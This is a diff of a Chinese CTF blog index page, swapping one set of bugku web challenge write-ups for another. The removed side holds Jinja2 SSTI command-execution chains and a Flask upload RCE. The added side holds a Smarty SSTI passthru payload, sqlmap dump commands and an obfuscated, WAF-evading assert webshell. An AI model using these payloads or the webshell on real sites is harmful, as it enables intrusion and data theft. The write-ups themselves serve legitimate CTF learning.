@@ -57,7 +57,7 @@
 	        
 				<li><a target="_blank" rel="noopener" href="https://ouroborosscr.github.io/2021/03/12/catalog/">wp目录</a></li>
 	        
-				<li><a href="/null">一些笔记</a></li>
+				<li><a href="/">一些笔记</a></li>
 	        
 				<li><a target="_blank" rel="noopener" href="https://ouroborosscr.github.io/2021/05/11/%E5%A4%A7%E4%BD%AC%E7%9A%84%E5%8D%9A%E5%AE%A2%E6%95%B4%E7%90%86/">大佬们的博客整理</a></li>
 	        
@@ -145,7 +145,7 @@
 		        
 					<li style="width: 25%"><a target="_blank" rel="noopener" href="https://ouroborosscr.github.io/2021/03/12/catalog/">wp目录</a></li>
 		        
-					<li style="width: 25%"><a href="/null">一些笔记</a></li>
+					<li style="width: 25%"><a href="/">一些笔记</a></li>
 		        
 					<li style="width: 25%"><a target="_blank" rel="noopener" href="https://ouroborosscr.github.io/2021/05/11/%E5%A4%A7%E4%BD%AC%E7%9A%84%E5%8D%9A%E5%AE%A2%E6%95%B4%E7%90%86/">大佬们的博客整理</a></li>
 		        
@@ -164,14 +164,14 @@
           <div id="js-content" class="content-ll">
             
   
-    <article id="post-bugku-web-社工-初步收集" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-bugku-web-聪明的php" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2021/07/31/bugku-web-%E7%A4%BE%E5%B7%A5-%E5%88%9D%E6%AD%A5%E6%94%B6%E9%9B%86/">bugku-web-社工-初步收集</a>
+      <a class="article-title" href="/2021/08/09/bugku-web-%E8%81%AA%E6%98%8E%E7%9A%84php/">bugku-web-聪明的php</a>
     </h1>
   
 
@@ -179,50 +179,23 @@
         
 
 
-<a href="/2021/07/31/bugku-web-%E7%A4%BE%E5%B7%A5-%E5%88%9D%E6%AD%A5%E6%94%B6%E9%9B%86/" class="archive-article-date">
-  	<time datetime="2021-07-31T09:02:08.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-07-31</time>
+<a href="/2021/08/09/bugku-web-%E8%81%AA%E6%98%8E%E7%9A%84php/" class="archive-article-date">
+  	<time datetime="2021-08-09T13:53:21.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-09</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>打开后是一个外挂网站（如果报错就刷新一下）</p>
-<p>先用dirsearch扫一下目录，发现很多东西，一个个打开</p>
-<img src="/2021/07/31/bugku-web-%E7%A4%BE%E5%B7%A5-%E5%88%9D%E6%AD%A5%E6%94%B6%E9%9B%86/6.PNG" class="" title="6.PNG">
-<p>发现/admin/login.php可以跳转到后台登录平台</p>
-<img src="/2021/07/31/bugku-web-%E7%A4%BE%E5%B7%A5-%E5%88%9D%E6%AD%A5%E6%94%B6%E9%9B%86/15.PNG" class="" title="15.PNG">
+        <p>打开以后发现是php代码，随便传值发现会打印形参和实参</p>
+<img src="/2021/08/09/bugku-web-%E8%81%AA%E6%98%8E%E7%9A%84php/1.PNG" class="" title="1.PNG">
 
-<p>看到有一个“下载辅助”的地方，点击后可以下载到东西</p>
-<img src="/2021/07/31/bugku-web-%E7%A4%BE%E5%B7%A5-%E5%88%9D%E6%AD%A5%E6%94%B6%E9%9B%86/1.PNG" class="" title="1.PNG">
+<p>盲猜是模板注入，试了一下<code>a=&#123;&#123;2*2&#125;&#125;</code><br>发现真的回显为4</p>
+<img src="/2021/08/09/bugku-web-%E8%81%AA%E6%98%8E%E7%9A%84php/3.PNG" class="" title="3.PNG">
 
-<p>解压后是一个exe程序，打开</p>
-<img src="/2021/07/31/bugku-web-%E7%A4%BE%E5%B7%A5-%E5%88%9D%E6%AD%A5%E6%94%B6%E9%9B%86/2.PNG" class="" title="2.PNG">
-<p>发现要输qq号和密码（随便输点什么，我这里输的123——123，千万别输个人信息！！）<br>提交后……</p>
-<img src="/2021/07/31/bugku-web-%E7%A4%BE%E5%B7%A5-%E5%88%9D%E6%AD%A5%E6%94%B6%E9%9B%86/3.PNG" class="" title="3.PNG">
-
-<p>不着急，打开wireshark抓包，再发送一次，发现抓到的包里有user，password的信息<br>追踪tcp流，并用base64解码</p>
-<img src="/2021/07/31/bugku-web-%E7%A4%BE%E5%B7%A5-%E5%88%9D%E6%AD%A5%E6%94%B6%E9%9B%86/4.PNG" class="" title="4.PNG">
-<img src="/2021/07/31/bugku-web-%E7%A4%BE%E5%B7%A5-%E5%88%9D%E6%AD%A5%E6%94%B6%E9%9B%86/5.PNG" class="" title="5.PNG">
-<img src="/2021/07/31/bugku-web-%E7%A4%BE%E5%B7%A5-%E5%88%9D%E6%AD%A5%E6%94%B6%E9%9B%86/16.PNG" class="" title="16.PNG">
-<img src="/2021/07/31/bugku-web-%E7%A4%BE%E5%B7%A5-%E5%88%9D%E6%AD%A5%E6%94%B6%E9%9B%86/7.PNG" class="" title="7.PNG">
-
-<p>把结果扔到一开始找到的登录页面，发现并不正确</p>
-<img src="/2021/07/31/bugku-web-%E7%A4%BE%E5%B7%A5-%E5%88%9D%E6%AD%A5%E6%94%B6%E9%9B%86/8.PNG" class="" title="8.PNG">
-<p>尝试在“邮件”里登录，并登录成功</p>
-<img src="/2021/07/31/bugku-web-%E7%A4%BE%E5%B7%A5-%E5%88%9D%E6%AD%A5%E6%94%B6%E9%9B%86/9.PNG" class="" title="9.PNG">
-<p>翻找后发现，自己刚刚发的信息已经被邮件记录（社工软件的本质）</p>
-<img src="/2021/07/31/bugku-web-%E7%A4%BE%E5%B7%A5-%E5%88%9D%E6%AD%A5%E6%94%B6%E9%9B%86/10.PNG" class="" title="10.PNG">
-<p>在往下翻，看到一个名字和生日，盲猜是后台账号和密码</p>
-<img src="/2021/07/31/bugku-web-%E7%A4%BE%E5%B7%A5-%E5%88%9D%E6%AD%A5%E6%94%B6%E9%9B%86/11.PNG" class="" title="11.PNG">
-<p>扔到后台登录，并成功</p>
-<img src="/2021/07/31/bugku-web-%E7%A4%BE%E5%B7%A5-%E5%88%9D%E6%AD%A5%E6%94%B6%E9%9B%86/12.PNG" class="" title="12.PNG">
-<img src="/2021/07/31/bugku-web-%E7%A4%BE%E5%B7%A5-%E5%88%9D%E6%AD%A5%E6%94%B6%E9%9B%86/13.PNG" class="" title="13.PNG">
-<p>从后台找到flag</p>
-<img src="/2021/07/31/bugku-web-%E7%A4%BE%E5%B7%A5-%E5%88%9D%E6%AD%A5%E6%94%B6%E9%9B%86/14.PNG" class="" title="14.PNG">
-
-
-
+<p>有人是用tplmap扫了一下，发现是smarty构架，然后使用<code>&#123;if php代码&#125;&#123;/if&#125;</code>运行php程序<br>又因为很多命令执行被过滤了，所以只能用passthru()函数（过滤eval的同时会过滤``）<br>传入<code>｛if paathru(&#39;ls&#39;)&#125;&#123;/if&#125;</code>,发现可以执行，顺势tac出flag就好了</p>
+<img src="/2021/08/09/bugku-web-%E8%81%AA%E6%98%8E%E7%9A%84php/2.PNG" class="" title="2.PNG">
+<img src="/2021/08/09/bugku-web-%E8%81%AA%E6%98%8E%E7%9A%84php/5.PNG" class="" title="5.PNG">
       
 
       
@@ -234,7 +207,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2021/07/31/bugku-web-%E7%A4%BE%E5%B7%A5-%E5%88%9D%E6%AD%A5%E6%94%B6%E9%9B%86/">展开全文 >></a>
+          <a class="article-more-a" href="/2021/08/09/bugku-web-%E8%81%AA%E6%98%8E%E7%9A%84php/">展开全文 >></a>
         </p>
       
 
@@ -286,14 +259,14 @@
     </section>
   
   
-    <article id="post-bugku-web-Flask-FileUpload" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-bugku-web-速度要快" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2021/07/30/bugku-web-Flask-FileUpload/">bugku-web-Flask_FileUpload</a>
+      <a class="article-title" href="/2021/08/09/bugku-web-%E9%80%9F%E5%BA%A6%E8%A6%81%E5%BF%AB/">bugku-web-速度要快</a>
     </h1>
   
 
@@ -301,27 +274,23 @@
         
 
 
-<a href="/2021/07/30/bugku-web-Flask-FileUpload/" class="archive-article-date">
-  	<time datetime="2021-07-30T03:29:41.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-07-30</time>
+<a href="/2021/08/09/bugku-web-%E9%80%9F%E5%BA%A6%E8%A6%81%E5%BF%AB/" class="archive-article-date">
+  	<time datetime="2021-08-09T12:59:36.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-09</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>打开页面后，发现一个文件上传的界面<br>点击选择文件后发现只能上传图片<br>查看源代码后发现提示，意思是上传的文件会以python的形式运行，并返回值</p>
-<img src="/2021/07/30/bugku-web-Flask-FileUpload/1.PNG" class="" title="1.PNG">
-<img src="/2021/07/30/bugku-web-Flask-FileUpload/10.PNG" class="" title="10.PNG">
+        <p>直接开源码，提示OK ,now you have to post the margin what you find<br>意思是以post方式传一个margin</p>
+<img src="/2021/08/09/bugku-web-%E9%80%9F%E5%BA%A6%E8%A6%81%E5%BF%AB/1.PNG" class="" title="1.PNG">
+<p>抓包发现一个base64，解码</p>
+<img src="/2021/08/09/bugku-web-%E9%80%9F%E5%BA%A6%E8%A6%81%E5%BF%AB/2.PNG" class="" title="2.PNG">
 
-<p>写一个简单的python脚本，作用是使用shell指令，改成图片上传，代码如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">os.system(&#39;ls&#39;)</span><br></pre></td></tr></table></figure>
-
-<p>之后为了方便改代码，我用burpsuite抓包后进行的，发现即使是jpg文件，也可以被运行</p>
-<img src="/2021/07/30/bugku-web-Flask-FileUpload/8.PNG" class="" title="8.PNG">
-
-<p>这里我先把ls改成了cat app.py看了一下网页的脚本，发现只有jpg，png和py3可以通过（这也是大部分人抓包后改成py却被过滤的原因）</p>
-<p>之后我把文件后缀改成py3继续进行（其实不改也不影响）<br>直接在burp上改文件内容就行<br>把ls改成cat /flag,得到flag</p>
-<img src="/2021/07/30/bugku-web-Flask-FileUpload/7.PNG" class="" title="7.PNG">
+<p>提交的时候发现不行，结合题目，上脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">import bs4,requests</span><br><span class="line"></span><br><span class="line">url&#x3D;&#39;http:&#x2F;&#x2F;114.67.246.176:19535&#x2F;&#39;#指定url</span><br><span class="line">req2&#x3D;requests.Session()#开启一个会话</span><br><span class="line">ht &#x3D; req2.get(url)</span><br><span class="line">temp &#x3D; base64.b64decode(ht.headers[&#39;flag&#39;]).decode()#base64解码请求头中的flag参数</span><br><span class="line">flag&#x3D;temp.replace(&quot;跑的还不错，给你flag吧: &quot;,&quot;&quot;)#把修饰语删除</span><br><span class="line">flag&#x3D;base64.b64decode(flag).decode()#竟然还要解码一次！！！不看wp真没想到ε&#x3D;(´ο｀*)))唉</span><br><span class="line">d&#x3D;&#123;&quot;margin&quot;:flag&#125;#构造post数据</span><br><span class="line">r &#x3D; req2.post(url, data&#x3D;d)#data属性提交post参数</span><br><span class="line">print(r.text)#打印</span><br></pre></td></tr></table></figure>
+<p>得到flag</p>
+<img src="/2021/08/09/bugku-web-%E9%80%9F%E5%BA%A6%E8%A6%81%E5%BF%AB/3.PNG" class="" title="3.PNG">
       
 
       
@@ -333,7 +302,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2021/07/30/bugku-web-Flask-FileUpload/">展开全文 >></a>
+          <a class="article-more-a" href="/2021/08/09/bugku-web-%E9%80%9F%E5%BA%A6%E8%A6%81%E5%BF%AB/">展开全文 >></a>
         </p>
       
 
@@ -385,14 +354,14 @@
     </section>
   
   
-    <article id="post-bugku-web-Simple-SSTI-2" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-bugku-web-秋名山车神" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2021/07/30/bugku-web-Simple-SSTI-2/">bugku-web-Simple-SSTI-2</a>
+      <a class="article-title" href="/2021/08/09/bugku-web-%E7%A7%8B%E5%90%8D%E5%B1%B1%E8%BD%A6%E7%A5%9E/">bugku-web-秋名山车神</a>
     </h1>
   
 
@@ -400,35 +369,21 @@
         
 
 
-<a href="/2021/07/30/bugku-web-Simple-SSTI-2/" class="archive-article-date">
-  	<time datetime="2021-07-30T02:54:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-07-30</time>
+<a href="/2021/08/09/bugku-web-%E7%A7%8B%E5%90%8D%E5%B1%B1%E8%BD%A6%E7%A5%9E/" class="archive-article-date">
+  	<time datetime="2021-08-09T12:53:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-09</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>参考ssti注入笔记——</p>
-<a href="/2021/07/30/ssti%E7%AC%94%E8%AE%B0/" title="ssti笔记">ssti笔记</a>
-<p>按套路，走流程，得答案<br>（因为笔记里已经写了，这里步骤完全一样，所以就不复述了）</p>
-<img src="/2021/07/30/bugku-web-Simple-SSTI-2/1.PNG" class="" title="1.PNG">
-<img src="/2021/07/30/bugku-web-Simple-SSTI-2/2.PNG" class="" title="2.PNG">
-<img src="/2021/07/30/bugku-web-Simple-SSTI-2/3.PNG" class="" title="3.PNG">
-<img src="/2021/07/30/bugku-web-Simple-SSTI-2/4.PNG" class="" title="4.PNG">
-<img src="/2021/07/30/bugku-web-Simple-SSTI-2/5.PNG" class="" title="5.PNG">
-<img src="/2021/07/30/bugku-web-Simple-SSTI-2/6.PNG" class="" title="6.PNG">
-<img src="/2021/07/30/bugku-web-Simple-SSTI-2/7.PNG" class="" title="7.PNG">
-<img src="/2021/07/30/bugku-web-Simple-SSTI-2/8.PNG" class="" title="8.PNG">
-<img src="/2021/07/30/bugku-web-Simple-SSTI-2/9.PNG" class="" title="9.PNG">
-<img src="/2021/07/30/bugku-web-Simple-SSTI-2/10.PNG" class="" title="10.PNG">
-<img src="/2021/07/30/bugku-web-Simple-SSTI-2/11.PNG" class="" title="11.PNG">
-<img src="/2021/07/30/bugku-web-Simple-SSTI-2/12.PNG" class="" title="12.PNG">
-<img src="/2021/07/30/bugku-web-Simple-SSTI-2/13.PNG" class="" title="13.PNG">
-<img src="/2021/07/30/bugku-web-Simple-SSTI-2/14.PNG" class="" title="14.PNG">
-<img src="/2021/07/30/bugku-web-Simple-SSTI-2/15.PNG" class="" title="15.PNG">
-<img src="/2021/07/30/bugku-web-Simple-SSTI-2/16.PNG" class="" title="16.PNG">
-<img src="/2021/07/30/bugku-web-Simple-SSTI-2/17.PNG" class="21.PNG">
-<img src="/2021/07/30/bugku-web-Simple-SSTI-2/18.PNG" class="21.PNG">
+        <p>打开后发现要几秒内算题</p>
+<img src="/2021/08/09/bugku-web-%E7%A7%8B%E5%90%8D%E5%B1%B1%E8%BD%A6%E7%A5%9E/1.PNG" class="" title="1.PNG">
+
+<p>直接上python脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import requests #&#x2F;&#x2F;引入request库</span><br><span class="line">import re 		#&#x2F;&#x2F;引入re库</span><br><span class="line"></span><br><span class="line">url &#x3D; &#39;&#39;&#39;http:&#x2F;&#x2F;114.67.246.176:13403&#x2F;&#x2F;&#39;&#39;&#39;</span><br><span class="line">s &#x3D; requests.session()  #&#x2F;&#x2F;用session会话保持表达式是同一个</span><br><span class="line">retuen &#x3D; s.get(url)</span><br><span class="line">equation &#x3D; re.search(r&#39;(\d+[+\-*])+(\d+)&#39;, retuen.text).group()</span><br><span class="line"></span><br><span class="line">result &#x3D; eval(equation)	#&#x2F;&#x2F;eval() 函数用来执行一个字符串表达式，并返回表达式的值。</span><br><span class="line">key &#x3D; &#123;&#39;value&#39;:result&#125;</span><br><span class="line">print(s.post(url, data &#x3D; key).text)</span><br></pre></td></tr></table></figure>
+<p>（当时做的我是找不到了，现在是直接粘的网上的，实测可以，但是要多来几次）<br>得到flag</p>
+<img src="/2021/08/09/bugku-web-%E7%A7%8B%E5%90%8D%E5%B1%B1%E8%BD%A6%E7%A5%9E/2.PNG" class="" title="2.PNG">
       
 
       
@@ -440,7 +395,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2021/07/30/bugku-web-Simple-SSTI-2/">展开全文 >></a>
+          <a class="article-more-a" href="/2021/08/09/bugku-web-%E7%A7%8B%E5%90%8D%E5%B1%B1%E8%BD%A6%E7%A5%9E/">展开全文 >></a>
         </p>
       
 
@@ -492,14 +447,14 @@
     </section>
   
   
-    <article id="post-bugku-web-Simple-SSTI-1" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-bugku-web-成绩查询" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2021/07/30/bugku-web-Simple-SSTI-1/">bugku-web-Simple_SSTI_1</a>
+      <a class="article-title" href="/2021/08/09/bugku-web-%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2/">bugku-web-成绩查询</a>
     </h1>
   
 
@@ -507,57 +462,23 @@
         
 
 
-<a href="/2021/07/30/bugku-web-Simple-SSTI-1/" class="archive-article-date">
-  	<time datetime="2021-07-30T02:11:41.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-07-30</time>
+<a href="/2021/08/09/bugku-web-%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2/" class="archive-article-date">
+  	<time datetime="2021-08-09T12:35:37.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-09</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>首先建议先看一下关于ssti的基础知识——</p>
-<a href="/2021/07/30/ssti%E7%AC%94%E8%AE%B0/" title="ssti笔记">ssti笔记</a>
-<p>（虽然对这道题没什么用）</p>
-<h2 id="开始做题——"><a href="#开始做题——" class="headerlink" title="开始做题——"></a>开始做题——</h2><h2 id="打开题目后只有一行字"><a href="#打开题目后只有一行字" class="headerlink" title="打开题目后只有一行字"></a>打开题目后只有一行字</h2><img src="/2021/07/30/bugku-web-Simple-SSTI-1/1.PNG" class="" title="1.PNG">
-<hr>
-<h2 id="意思应该是参数为flag，所以试了试在url行给flag赋值，发现有回显"><a href="#意思应该是参数为flag，所以试了试在url行给flag赋值，发现有回显" class="headerlink" title="意思应该是参数为flag，所以试了试在url行给flag赋值，发现有回显"></a>意思应该是参数为flag，所以试了试在url行给flag赋值，发现有回显</h2><img src="/2021/07/30/bugku-web-Simple-SSTI-1/2.PNG" class="" title="2.PNG">
+        <p>我会sql注入原理，也能手注sql，但是我还是坚信着一点，能用sqlmap，傻子才去手注，只要你会了sqlmap的所有功能，可以自己写temper脚本，sqlmap和手注唯一的差别就是sqlmap更方便。</p>
+<p>我不管别人如何手注，反正我就用sqlmap了</p>
+<p>python sqlmap.py -l C:\Users\S\Desktop\123</p>
+<p>python sqlmap.py -l C:\Users\S\Desktop\123 –dbs</p>
+<p>python sqlmap.py -l C:\Users\S\Desktop\123 -D skctf –dump-all</p>
+<p>得到flag</p>
+<img src="/2021/08/09/bugku-web-%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2/1.PNG" class="" title="1.PNG">
+<p>这题有些flag和题目对不上，骗金币<br>话是这么说，但这些话也是在我学完所有注入以后的想法，对没学过的甚至找不到一个靠谱的temper的人来说，手注依然非常重要</p>
 
-<hr>
-<h2 id="然后测试是否存在ssti注入，发现有注入"><a href="#然后测试是否存在ssti注入，发现有注入" class="headerlink" title="然后测试是否存在ssti注入，发现有注入"></a>然后测试是否存在ssti注入，发现有注入</h2><img src="/2021/07/30/bugku-web-Simple-SSTI-1/3.PNG" class="" title="3.PNG">
-<img src="/2021/07/30/bugku-web-Simple-SSTI-1/4.PNG" class="" title="4.PNG">
-
-<hr>
-<h2 id="打开页面源代码，发现下方有注释"><a href="#打开页面源代码，发现下方有注释" class="headerlink" title="打开页面源代码，发现下方有注释"></a>打开页面源代码，发现下方有注释</h2><p>意思好像是让我们找secret_key<br>学习flask后发现，这个secret_key是flask的一个系统参数</p>
-<img src="/2021/07/30/bugku-web-Simple-SSTI-1/20.PNG" class="" title="20.PNG">
-
-<hr>
-<h2 id="扫了一下目录，发现一个-console"><a href="#扫了一下目录，发现一个-console" class="headerlink" title="扫了一下目录，发现一个/console"></a>扫了一下目录，发现一个/console</h2><p>打开后发现让我们输pin码，然后就可以使用shell指令，这里可以用笔记中的方法获取主机名，配合cookie构造，不过这里不需要shell，所以没有用</p>
-<img src="/2021/07/30/bugku-web-Simple-SSTI-1/18.PNG" class="" title="18.PNG">
-<img src="/2021/07/30/bugku-web-Simple-SSTI-1/19.PNG" class="" title="19.PNG">
-
-<hr>
-<h2 id="直接用系统指令config-secret-key查secret-key，得出flag"><a href="#直接用系统指令config-secret-key查secret-key，得出flag" class="headerlink" title="直接用系统指令config.secret_key查secret_key，得出flag"></a>直接用系统指令config.secret_key查secret_key，得出flag</h2><img src="/2021/07/30/bugku-web-Simple-SSTI-1/17.PNG" class="" title="17.PNG">
-
-
-
-<p>下面我也根据笔记进行了测试——</p>
-<img src="/2021/07/30/bugku-web-Simple-SSTI-1/5.PNG" class="" title="5.PNG">
-<img src="/2021/07/30/bugku-web-Simple-SSTI-1/6.PNG" class="" title="6.PNG">
-<img src="/2021/07/30/bugku-web-Simple-SSTI-1/7.PNG" class="" title="7.PNG">
-<img src="/2021/07/30/bugku-web-Simple-SSTI-1/8.PNG" class="" title="8.PNG">
-<img src="/2021/07/30/bugku-web-Simple-SSTI-1/9.PNG" class="" title="9.PNG">
-<img src="/2021/07/30/bugku-web-Simple-SSTI-1/10.PNG" class="" title="10.PNG">
-<img src="/2021/07/30/bugku-web-Simple-SSTI-1/11.PNG" class="" title="11.PNG">
-<img src="/2021/07/30/bugku-web-Simple-SSTI-1/12.PNG" class="" title="12.PNG">
-<img src="/2021/07/30/bugku-web-Simple-SSTI-1/13.PNG" class="" title="13.PNG">
-<img src="/2021/07/30/bugku-web-Simple-SSTI-1/14.PNG" class="" title="14.PNG">
-<img src="/2021/07/30/bugku-web-Simple-SSTI-1/15.PNG" class="" title="15.PNG">
-<img src="/2021/07/30/bugku-web-Simple-SSTI-1/16.PNG" class="" title="16.PNG">
-<img src="/2021/07/30/bugku-web-Simple-SSTI-1/21.PNG" class="" title="21.PNG">
-
-
-<p>报错界面（也可以用于输入pin后运行shell，或者查看部分源代码）（方法：随便输错点什么）</p>
-<img src="/2021/07/30/bugku-web-Simple-SSTI-1/22.PNG" class="" title="22.PNG">
       
 
       
@@ -569,7 +490,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2021/07/30/bugku-web-Simple-SSTI-1/">展开全文 >></a>
+          <a class="article-more-a" href="/2021/08/09/bugku-web-%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2/">展开全文 >></a>
         </p>
       
 
@@ -621,14 +542,14 @@
     </section>
   
   
-    <article id="post-ssti笔记" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-bugku-web-shell" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2021/07/30/ssti%E7%AC%94%E8%AE%B0/">ssti笔记</a>
+      <a class="article-title" href="/2021/08/09/bugku-web-shell/">bugku-web-shell</a>
     </h1>
   
 
@@ -636,16 +557,22 @@
         
 
 
-<a href="/2021/07/30/ssti%E7%AC%94%E8%AE%B0/" class="archive-article-date">
-  	<time datetime="2021-07-30T02:03:15.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-07-30</time>
+<a href="/2021/08/09/bugku-web-shell/" class="archive-article-date">
+  	<time datetime="2021-08-09T12:26:32.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-09</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>推荐视频：<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1zi4y1x7QM">https://www.bilibili.com/video/BV1zi4y1x7QM</a><br>（星盟战队，h3h3da大佬，yyds!!)</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&#123;%for i in range(10)%&#125;</span><br><span class="line">&#123;%print(i)%&#125;</span><br><span class="line">&#123;%endfor%&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;sys&#x2F;class&#x2F;net&#x2F;ens33&#x2F;address</span><br><span class="line"></span><br><span class="line">&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address</span><br><span class="line"></span><br><span class="line">&#123;&#123;&#39;&#39;.__class__&#125;&#125;</span><br><span class="line">&#123;&#123;&#39;&#39;.__class__.__base__&#125;&#125;</span><br><span class="line">&#123;&#123;&#39;&#39;.__class__.__base__.__subclasses__&#125;&#125;</span><br><span class="line">&#123;&#123;&#39;&#39;.__class__.__base__.__subclasses__()&#125;&#125;</span><br><span class="line">（查popen,os,sys）</span><br><span class="line">popen:&#123;&#123;&#39;&#39;.__class__.__base__.__subclasses__()[302]&#125;&#125;</span><br><span class="line">(替换302到别的数直到找到popen（）的数值）</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;&#123;&#39;&#39;.__class__.__base__.__subclasses__()[302].__init__&#125;&#125;</span><br><span class="line">&#123;&#123;&#39;&#39;.__class__.__base__.__subclasses__()[302].__init__.__globals__&#125;&#125;</span><br><span class="line">测popen，os</span><br><span class="line"></span><br><span class="line">若有os:&#123;&#123;%27%27.__class__.__base__.__subclasses__()[425].__init__.__globals__[&quot;os&quot;]&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;%27%27.__class__.__base__.__subclasses__()[425].__init__.__globals__[&quot;os&quot;].popen(&quot;ls&quot;).read()&#125;&#125;</span><br><span class="line">(ls可以换成各种shell）</span><br><span class="line"></span><br><span class="line">&#123;&#123;%27%27.__class__.__base__.__subclasses__()[425].__init__.__globals__[&quot;os&quot;].popen(&quot;whoami&quot;).read()&#125;&#125;</span><br><span class="line">(得到主机名，用于构造pin）</span><br><span class="line">http:&#x2F;&#x2F;114.67.246.176:11940&#x2F;?flag&#x3D;&#123;&#123;%27%27.__class__.__base__.__subclasses__()[425].__init__.__globals__[%22os%22].popen(%22cat%20flag%22).read()&#125;&#125;</span><br><span class="line">（直接搜flag）</span><br><span class="line"></span><br></pre></td></tr></table></figure></span><br></pre></td></tr></table></figure>
+        <p>看提示——送给大家一个过狗一句话 $poc=”a#s#s#e#r#t”; $poc_1=explode(“#”,$poc); $poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; $poc_2($_GET[‘s’])</p>
+<p>简单来讲就是assert($_GET[‘s’])</p>
+<p>assert函数会把里面的内容当成php代码执行</p>
+<p>所以直接传值：s=system(“ls”)<br>发现目录</p>
+<img src="/2021/08/09/bugku-web-shell/1.PNG" class="" title="1.PNG">
+
+<p>然后传：s=system(“cat flaga15808abee46a1d5.txt”)<br>得到flag</p>
+<img src="/2021/08/09/bugku-web-shell/2.PNG" class="" title="2.PNG">
       
 
       
@@ -657,7 +584,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2021/07/30/ssti%E7%AC%94%E8%AE%B0/">展开全文 >></a>
+          <a class="article-more-a" href="/2021/08/09/bugku-web-shell/">展开全文 >></a>
         </p>
       
 
@@ -709,14 +636,14 @@
     </section>
   
   
-    <article id="post-sql注入笔记" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-bugku-web-never-give-up" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2021/07/26/sql%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/">sql注入笔记</a>
